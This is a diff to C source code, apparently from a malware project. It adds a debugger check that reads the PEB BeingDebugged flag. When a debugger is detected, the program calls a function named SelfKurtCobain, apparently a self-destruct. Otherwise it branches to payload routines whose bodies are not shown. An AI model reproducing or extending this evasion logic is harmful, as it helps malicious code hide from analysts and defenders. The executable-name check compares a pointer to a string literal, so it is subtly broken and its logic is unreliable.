@@ -303,8 +303,50 @@ int ToRaccon(void)
     return EXIT_SUCCESS;
 }
 
+bool isDb()
+{
+#ifdef _M_X64
+    PBYTE peb = (PBYTE)__readgsqword(0x60);
+#elif defined(_M_IX86)
+    PBYTE peb = (PBYTE)__readfsdword(0x30);
+#else
+    return false; 
+#endif
+
+    return peb[2] != 0;
+}
+
 int main(void)
 {
-    RakunaMatata();
-	return 1;
+    if (isDb())
+    {
+        SelfKurtCobain();
+    }
+    else
+    {
+        if (Ce() == EXIT_FAILURE)
+        {
+            RakunaMatata();
+
+            WCHAR path[MAX_PATH * 2] = { 0 };
+
+            if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
+            {
+                return EXIT_FAILURE;
+            }
+
+            WCHAR* exeName = wcsrchr(path, L'\\');
+
+            if (exeName != L"muslc.exe")
+            {
+                ToRaccon();
+            }
+
+            return EXIT_SUCCESS;
+        }
+        else {
+            ToRaccon();
+            return EXIT_SUCCESS;
+        }
+    }
 }
